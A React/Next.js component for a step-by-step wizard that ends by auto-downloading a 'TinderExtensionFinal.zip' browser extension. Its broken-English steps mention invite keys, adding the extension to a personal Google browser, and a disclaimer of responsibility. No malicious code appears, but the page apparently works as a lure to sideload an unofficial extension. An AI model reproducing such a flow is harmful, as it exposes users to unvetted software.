'use client'
import Image from "next/image"
import Stepper from "./stepper"


export default function StepperHome() {
    const handleStepChange = (step: number) => {
        console.log("Current step:", step)
    }
    const handleFinalStep = () => {
        const link = document.createElement("a")
        link.href = "/files/TinderExtensionFinal.zip"
        link.download = "TinderExtensionFinal.zip"
        link.click()
    }

    return (
        <Stepper
            initialStep={1}
            onStepChange={handleStepChange}
            onFinalStepCompleted={handleFinalStep}
            backButtonText="Previous"
            nextButtonText="Next"
            className="bg-white"
        >
            <div>
                <div className="flex items-center justify-center flex-col">
                    <div>
                        <span className="font-bold">Tinder</span> only availible for person who have Invite Key !
                    </div>
                    <div>
                        Please make sure you are have Invite Key !
                    </div>
                    <div>
                        <Image src={"/meme.jpg"} alt="meme" width={400} height={200} />
                    </div>
                </div>
            </div>
            <div>
                <div className="flex items-center justify-center flex-col">
                    <div className="text-center">
                        <span className="font-bold">ATTENTION</span> : USE SIMILAR INVITE KEY MAY BE HAVE WRONG MATCH
                    </div>
                    <div className="text-center">
                        ONE PERSON ONE KEY ONLY !
                    </div>

                    <div className="text-center">
                        <span className="font-bold">ATTENTION</span> : ADD TO YOUR PERSONAL EMAIL GOOGLE BROWSER
                    </div>
                </div>
            </div>
            <div>
                <div className="flex items-center justify-center flex-col">
                    <div className="text-center uppercase">
                        We do not take any responsibility if any problem occurs.
                    </div>
                </div>
            </div>
            <div>
                <div className="flex items-center justify-center flex-col">
                    <div className="text-center uppercase">
                        PLEASE ASK SOME ONE TO KNOW HOW TO ADD
                    </div>
                    <div className="text-center uppercase">
                        DOWNLOAD IS VERY FAST ! UNZIP IT
                    </div>
                </div>
            </div>
        </Stepper>
    )
}
